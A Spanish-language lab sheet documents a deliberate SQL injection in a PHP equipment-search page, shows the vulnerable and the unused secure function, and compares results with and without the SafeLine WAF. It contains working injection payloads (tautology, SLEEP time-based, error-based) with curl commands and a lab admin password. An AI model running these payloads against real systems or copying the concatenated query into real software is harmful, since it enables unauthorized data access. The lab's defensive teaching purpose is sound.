# LAB-02 — SQL Injection en el buscador de inventario

| Campo | Valor |
|---|---|
| **ID** | LAB-02 |
| **Tipo** | SQL Injection — Búsqueda de equipos (lectura) |
| **Riesgo** | Alto |
| **CVSS** | 8.6 |
| **CWE** | CWE-89 (Improper Neutralization of Special Elements used in an SQL Command) |
| **OWASP** | A03:2021 — Injection |
| **Endpoint** | `GET /fa/sistemas/equipment/search.php?q=` |
| **Acceso** | Requiere sesión iniciada (cualquier rol) |
| **Implementada** | 26 de septiembre de 2026 |

---

## 1. Qué hace

El buscador de equipos acepta un término de texto libre y lo mete dentro de tres
condiciones `LIKE` de un `SELECT`. El término no viaja como dato: viaja como
**código SQL**.

La consecuencia práctica es que el buscador no filtra, el atacante decide. Con
una comilla y un `OR` cierra el patrón, vuelve verdadera la condición y la
consulta devuelve el inventario completo. Con `SLEEP()` deja de responder durante
los segundos que se le pidan. Con una comilla suelta, el error de MariaDB sale
pintado en la página.

A diferencia de LAB-01, aquí no hace falta cerrar la consulta con `--` ni con
`#`: es un `SELECT` de lectura, la comilla cierra el `LIKE` y la cláusula se
agrega antes del `ORDER BY`. Tampoco hay contraseña ni sesión que preservar: la
inyección está en la lectura del catálogo, y con eso basta.

---

## 2. Dónde está el código

### 2.1 La consulta vulnerable

`config/lab_search.php`, función `lab_search_equipment()` (línea 61):

```php
function lab_search_equipment($q)
{
    // ESTA ES LA VULNERABILIDAD DELIBERADA (LAB-02).
    // El termino del usuario se concatena en el LIKE.
    $sql = "SELECT e.id, e.inventory_number, e.model, e.status, e.location, e.price
               FROM equipment e
              WHERE e.model LIKE '%$q%'
                 OR e.inventory_number LIKE '%$q%'
                 OR e.location LIKE '%$q%'
              ORDER BY e.id";

    return db_all($sql);
}
```

`$q` aparece tres veces, interpolado. `db_all()` sí acepta parámetros
vinculados, pero aquí se llaman sin ellos: la consulta ya está armada cuando
llega a la base de datos.

### 2.2 El consumo

`equipment/search.php`, líneas 23 y 38:

```php
$termino = trim(input_get('q'));
...
$resultado = lab_search_equipment($termino);
```

Y las líneas 39 a 45 son la razón por la que el payload de error funciona en
video, porque la excepción se muestra al usuario:

```php
} catch (mysqli_sql_exception $ex) {
    // Un payload que rompe la sintaxis produce un error de MySQL. Se
    // muestra tal cual: en Escenario A es la senal de que la consulta
    // se esta ejecutando con la entrada del usuario dentro.
    $error_sql = $ex->getMessage();
    $resultado = array();
}
```

La página imprime ese mensaje en un `alert` de Bootstrap (línea 127). No hay
filtro, ni mensaje genérico, ni registro a un lado.

### 2.3 La corrección que existe pero no se usa

`config/lab_search.php`, línea 86:

```php
function secure_search_equipment($q)
{
    $termino = '%' . str_replace(array('\\', '%', '_'), array('\\\\', '\%', '\_'), $q) . '%';

    return db_all(
        "SELECT e.id, e.inventory_number, e.model, e.status, e.location, e.price
           FROM equipment e
          WHERE e.model LIKE ?
             OR e.inventory_number LIKE ?
             OR e.location LIKE ?
          ORDER BY e.id",
        array($termino, $termino, $termino)
    );
}
```

Los tres comodines `%` viajan como parámetro vinculado, y el comodín que
escriba el usuario se escapa con `str_replace()` para que no rompa el patrón.
El comentario del archivo lo dice sin rodeos: *"secure_search_equipment()
existe y es correcta, pero no la usa equipment/search.php"*. Es el mismo punto
que en LAB-01: la corrección está escrita, probada y desconectada.

---

## 3. Por qué existe en una app real

No es un descuido de teclear. Es la forma en que se escribían los buscadores
antes de que las consultas preparadas fueran el estándar, y sobrevivió por la
razón más mundana que existe: el módulo funcionaba.

El buscador se escribió como una caja de texto con `LIKE '%$q%'`, porque era
lo rápido. Cuando se оконizó la aplicación se añadió el parámetro `?q=`, y
`equipment/search.php` siguió llamando a la función vieja sin revisarla. Nadie
notó el problema hasta que la auditoría anual pidió filtrar por categoría, y ese
filtro nuevo **sí** se hizo con consultas preparadas y en memoria
(`equipment/search.php`, líneas 50 a 61). Conviven las dos formas en la misma
pantalla: el código viejo que filtra mal y el código nuevo que filtra bien.

Ese contraste es el argumento de la demostración: la vulnerabilidad no está en
el lenguaje, está en que la migración a consultas preparadas se hizo a medias.

---

## 4. Payloads

Probados contra `http://localhost/fa/sistemas/equipment/search.php` con la
sesión de administrador. La tabla `equipment` tiene **55 equipos**.

| # | Término en `?q=` | Tipo | Resultado verificado |
|---:|---|---|---|
| 1 | `Dell` | **Control** | Búsqueda normal: 17 equipos (solo coincidencias de modelo) |
| 2 | `q=` (vacío) | Control | El `LIKE '%%'` devuelve los 55 equipos: el buscador sin filtro no filtra |
| 2 | `' OR '1'='1` | Tautología | Devuelve los **55 equipos** del inventario |
| 3 | `INV-000053' AND SLEEP(3) AND 'a' LIKE '` | Basada en tiempo | La respuesta tarda **~3010 ms** frente a ~8 ms del control |
| 4 | `'` | Basada en error | La página muestra el error de MariaDB |

### Variante a mano

```bash
# 1. Control: busqueda normal
curl -s -o /dev/null -w "%{time_total} s\n" -b cookies.txt --get \
  --data-urlencode "q=Dell" \
  "http://localhost/fa/sistemas/equipment/search.php"

# 2. Tautologia: el inventario completo
curl -s -b cookies.txt --get --data-urlencode "q=' OR '1'='1" \
  "http://localhost/fa/sistemas/equipment/search.php" | grep -oE 'Se encontraron <strong>[0-9]+</strong>'

# 3. SLEEP: la consulta se esta ejecutando
time curl -s -o /dev/null -b cookies.txt --get \
  --data-urlencode "q=INV-000053' AND SLEEP(3) AND 'a' LIKE '" \
  "http://localhost/fa/sistemas/equipment/search.php"

# 4. Error: la comilla suelta rompe la sintaxis
curl -s -b cookies.txt --get --data-urlencode "q='" \
  "http://localhost/fa/sistemas/equipment/search.php" | grep -A2 "Error de base de datos"
```

### Regla del payload

Usa siempre `--data-urlencode`. El término lleva comilla simple y espacio, y
escribido a mano en la URL se rompe antes de llegar a la aplicación: la petición
debe ir con `'`, `%20` y, en el caso de `SLEEP`, los paréntesis codificados. Con
`--data-urlencode` curl se encarga y el payload llega intacto.

El tiempo se mide con `time` (o con `date +%s%N` como hace la matriz). El control
debería dar ~8 ms; cualquier valor cercano a 3000 ms confirma que el `SLEEP`
está corriendo del lado de la base de datos, no del navegador.

---

## 5. Escenario A vs Escenario B

El objetivo de la demostración es comparar el **mismo código** en los dos lados.

| Prueba | Escenario A (Apache directo) | Escenario B (SafeLine) |
|---|---|---|
| 1. Búsqueda normal (`Dell`) | 17 resultados | 17 resultados |
| 2. Sin término (`q=`) | 55 resultados (sin filtrar) | 55 resultados (sin filtrar) |
| 3. `' OR '1'='1` | **Devuelve 55 equipos** | **Bloqueado** |
| 4. `SLEEP(3)` | **Responde en ~3 s** | **Bloqueado** |
| 5. `'` (error) | **Muestra el error de MariaDB** | **Bloqueado** |

Las dos primeras filas son el control: deben comportarse igual en ambos
escenarios, para demostrar que el WAF no rompe el uso normal.

### Sesión previa

Las pruebas de esta ficha necesitan una sesión iniciada. El archivo de cookies
se genera una vez y se reutiliza:

```bash
curl -s -o /dev/null -c cookies.txt \
  --data-urlencode "username=admin" --data-urlencode "password=Admin_2026!" \
  http://localhost/fa/sistemas/login.php
```

### Escenario A — Apache directo

```bash
# Control
curl -s -b cookies.txt --get --data-urlencode "q=Dell" \
  "http://localhost/fa/sistemas/equipment/search.php" | grep -oE 'Se encontraron <strong>[0-9]+</strong>'

# Ataque 1: tautologia
curl -s --path-as-is -b cookies.txt "http://localhost/fa/sistemas/equipment/search.php" --get --data-urlencode "q=' OR '1'='1"

# Ataque 2: inyeccion basada en tiempo
time curl -s -o /dev/null --path-as-is -b cookies.txt "http://localhost/fa/sistemas/equipment/search.php" --get --data-urlencode "q=INV-000053' AND SLEEP(3) AND 'a' LIKE '"

# Ataque 3: error basado
curl -s --path-as-is -b cookies.txt "http://localhost/fa/sistemas/equipment/search.php" --get --data-urlencode "q='"
```

### Escenario B — detrás de SafeLine

Mismos comandos, mismo orden, solo cambia el host. SafeLine escuchará en el
puerto `8000` y reenviará a `http://127.0.0.1:80`. **Esta ejecución todavía no
se ha hecho**: SafeLine no está instalado y se desplegará después, en el VPS.

```bash
# Control
curl -s -b cookies.txt --get --data-urlencode "q=Dell" \
  "http://192.168.100.22:8000/fa/sistemas/equipment/search.php" | grep -oE 'Se encontraron <strong>[0-9]+</strong>'

# Ataque 1: tautologia
curl -s --path-as-is -b cookies.txt "http://192.168.100.22:8000/fa/sistemas/equipment/search.php" --get --data-urlencode "q=' OR '1'='1"

# Ataque 2: inyeccion basada en tiempo
time curl -s -o /dev/null --path-as-is -b cookies.txt "http://192.168.100.22:8000/fa/sistemas/equipment/search.php" --get --data-urlencode "q=INV-000053' AND SLEEP(3) AND 'a' LIKE '"

# Ataque 3: error basado
curl -s --path-as-is -b cookies.txt "http://192.168.100.22:8000/fa/sistemas/equipment/search.php" --get --data-urlencode "q='"
```

### Cómo lo verifica la matriz

`documents/lab_matrix.sh` ejecuta las nueve prácticas del laboratorio contra un
origen de destino. Para LAB-02 no adivina: **comprueba un marcador exacto** en
la respuesta. Estos son los marcadores que usa, textuales:

| Prueba | Marcador exacto | Interpretación | Umbral |
|---|---|---|---|
| Tautología | `Se encontraron <strong>[0-9]+</strong>` | Extrae el número de la página y lo compara | Escenario A: `N >= 50` |
| `SLEEP(3)` | `date +%s%N` antes y después | Diferencia en milisegundos | Escenario A: `MS >= 2500` |
| Error | `error de MySQL` \| `MariaDB` \| `You have an error` | `grep -qiE`, sin distinguir mayúsculas | Si aparece, el error está expuesto |

La lógica es la misma en los dos escenarios, invertida por la bandera `--waf`:
en Escenario A la prueba **debe** pasar, en Escenario B **debe fallar**. Por eso
el resumen final distingue `OK`, `BLOQ` y `FALLO`, y por eso los ataques de LAB-01
y LAB-02 pueden contarse en la misma tabla que los que un WAF no detiene
(LAB-03 y LAB-08).

```bash
# Escenario A
./documents/lab_matrix.sh

# Escenario B
./documents/lab_matrix.sh http://192.168.100.22:8000/fa/sistemas --waf -v
```

---

## 6. Qué debería hacer SafeLine

SafeLine analiza el parámetro `q` de la petición `GET` y debe clasificar el
payload como inyección SQL **antes** de que la solicitud llegue a Apache. No
importa que sea un `GET` de lectura ni que el método sea "menos peligroso": el
mismo parámetro que en LAB-01 viajaba en el cuerpo del `POST` aquí viaja en la
cadena de consulta, y la regla debe cubrir las dos formas.

| Aspecto | Valor esperado |
|---|---|
| Regla activada | Inyección SQL (parámetro `q`) |
| Modo recomendado | `Strict` |
| Respuesta | Página de bloqueo de SafeLine, no el buscador de la app |
| Origen en la app | Ninguna: el request no debe llegar a `equipment/search.php` |
| Efecto secundario esperado | `audit_log` no debe crecer con una fila `SEARCH` por payload |

Ese último punto es la prueba de que el corte ocurrió **antes** de la
aplicación. `equipment/search.php` registra cada búsqueda en la bitácora
(línea 64: `audit_log('SEARCH', 'equipment', ...)`). En el Escenario A el conteo
de filas `SEARCH` aumenta con cada payload, porque la petición entra a la app y
se registra; en el Escenario B el conteo no debe moverse, porque SafeLine corta
antes:

```sql
SELECT COUNT(*) FROM audit_log WHERE accion = 'SEARCH';   -- repetir antes y despues del Escenario B
```

El caso del `SLEEP` tiene una lectura adicional: si SafeLine bloquea la
petición, la respuesta también baja de ~3000 ms a unos milisegundos. Es la
misma comprobación que hace la matriz, y de nuevo sin tocar la base de datos.

---

## 7. Aislamiento de la vulnerabilidad

Regla del proyecto: **una sola función vulnerable por práctica**, para que el
resultado de la matriz no se mezcle.

- `lab_search_equipment()` está en `config/lab_search.php` y solo la llama
  `equipment/search.php`.
- Dentro de esa misma pantalla, los filtros de estado y categoría **no** son
  vulnerables: se resuelven en memoria sobre el resultado, y la única consulta
  que toca la base usa parámetro vinculado (`db_row("... WHERE id = ?", ...)`).
- `db_query()`, `db_row()` y `db_all()` se usan con parámetros en el resto de
  la aplicación; la única concatenación de entrada de usuario en un `SELECT` de
  lectura es la de `lab_search_equipment()`.
- `secure_search_equipment()` existe pero no se invoca, para que la corrección
  quede a la vista en el mismo archivo.

---

## 8. La conclusión del laboratorio

SafeLine bloquea el ataque, y eso es una defensa real. Pero un WAF es una capa
adicional, no la solución: si alguien desactiva el proxy, escribe otro cliente
o encuentra una forma de codificar el payload que el WAF no inspecciona, la
vulnerabilidad sigue ahí. Un `SLEEP` de tres segundos no necesita ser bloqueado
para ya ser un problema.

La corrección real está escrita y es una línea: en `equipment/search.php`,
cambiar `lab_search_equipment($termino)` por `secure_search_equipment($termino)`.
Esa función ya existe en el mismo archivo, con los tres parámetros vinculados y
el comodín del usuario escapado.

Y hay una segunda, más barata: dejar de imprimir el mensaje de MySQL al usuario.
Un error de base de datos en pantalla no es un detalle cosmético, es una
fuga de información que le entrega al atacante la versión del motor, el nombre de
la base y la forma de la consulta.

`secure_search_equipment()` nunca se conectó.
